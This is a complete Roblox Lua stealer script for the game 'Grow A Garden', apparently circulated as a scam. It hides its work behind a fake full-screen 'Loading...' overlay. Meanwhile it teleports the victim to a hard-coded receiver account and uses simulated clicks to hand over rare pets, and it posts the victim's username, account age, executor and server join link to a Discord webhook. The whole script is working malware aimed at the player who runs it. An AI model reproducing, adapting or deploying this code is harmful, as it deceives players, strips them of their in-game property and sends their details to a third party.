repeat task.wait() until game:IsLoaded()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
local VICTIM = game.Players.LocalPlayer
local USERNAMES = {"ZeeS_Farm01"}
local PET_WHITELIST = {
    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
}

local victimPetTable = {}
local petSequence = {}
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local request = http_request or request or HttpPost or syn.request
local dataModule = require(ReplicatedStorage.Modules.DataService)

------------------------------
-- üî≥ UI: –ü–æ–ª–Ω–æ—ç–∫—Ä–∞–Ω–Ω—ã–π —á—ë—Ä–Ω—ã–π GUI —Å –∞–Ω–∏–º–∞—Ü–∏–µ–π
------------------------------
local function showLoadingScreen()
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoadingCover"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = VICTIM:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 1 -- –ù–∞—á–∏–Ω–∞–µ—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –ø—Ä–æ–∑—Ä–∞—á–Ω—ã–º
    frame.Active = false
    frame.ZIndex = 10

    local fadeIn = TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0})
    fadeIn:Play()

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.35, 0)
    title.BackgroundTransparency = 1
    title.Text = "Loading..."
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 64
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextStrokeTransparency = 0.5
    title.ZIndex = 11

    local timerLabel = Instance.new("TextLabel", frame)
    timerLabel.Size = UDim2.new(0, 150, 0, 50)
    timerLabel.Position = UDim2.new(1, -160, 1, -60)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "15"
    timerLabel.Font = Enum.Font.GothamSemibold
    timerLabel.TextSize = 32
    timerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    timerLabel.ZIndex = 11

    task.spawn(function()
        for i = 15, 1, -1 do
            timerLabel.Text = tostring(i)
            task.wait(1)
        end
        gui:Destroy()
    end)
end

------------------------------
-- üõ† –£—Ç–∏–ª–∏—Ç—ã
------------------------------
local function getPetObject(petUid)
    for _, obj in ipairs(VICTIM.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUid then return obj end
    end
    for _, obj in ipairs(workspace[VICTIM.Name]:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUid then return obj end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function unequipPet()
    VICTIM.Character.Humanoid:UnequipTools()
end

local function checkPetsWhitelist(petName)
    for _, name in PET_WHITELIST do
        if string.find(petName, name) then return true end
    end
    return false
end

local function getPlayersPets()
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhitelist(value.PetType) then
            table.insert(victimPetTable, value.PetType)
            table.insert(petSequence, {uid = petUid, name = value.PetType})
        end
    end
end

local function teleportTarget(targetName)
    local target = Players:FindFirstChild(targetName)
    if target and target.Character then
        VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
    end
end

local function pressCenterMouse(duration)
    local centerX, centerY = workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2
    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, nil, false)
    task.wait(duration)
    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, nil, false)
end

------------------------------
-- üîÅ –¶–∏–∫–ª –ø–µ—Ç–æ–≤
------------------------------
local function startPetCycle(targetName)
    task.spawn(function()
        local index = 1
        while Players:FindFirstChild(targetName) do
            local petInfo = petSequence[index]
            local petObj = getPetObject(petInfo.uid)

            if petObj then
                equipPet(petObj)
                task.wait(0.2)
                pressCenterMouse(0.5)
                unequipPet()
            end

            index += 1
            if index > #petSequence then index = 1 end
            task.wait(5)
        end
    end)
end

------------------------------
-- üì§ Discord Webhook
------------------------------
local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "üåµ Grow A Garden Hit - DARK SKIDS üçÄ",
        color = 65280,
        fields = {
            {
                name = "üë§ **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name,
                    table.concat(USERNAMES, " "),
                    identifyexecutor(),
                    VICTIM.AccountAge
                )
            },
            {
                name = "üí∞ **Total Value**",
                value = string.format("```%s¬¢```", totalValue)
            },
            {
                name = "üå¥ **Backpack**",
                value = string.format("```%s```", petList)
            },
            {
                name = "üèùÔ∏è **Join with URL**",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                    game.JobId, game.PlaceId, game.JobId)
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local payload = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local body = HttpService:JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

------------------------------
-- üöÄ –ì–ª–∞–≤–Ω—ã–π –∑–∞–ø—É—Å–∫
------------------------------
getPlayersPets()

task.spawn(function()
    while task.wait(1) do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(USERNAMES, player.Name) then
                showLoadingScreen()

                task.delay(5, function()
                    teleportTarget(player.Name)
                    startPetCycle(player.Name)
                end)

                createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
                return
            end
        end
    end
end)
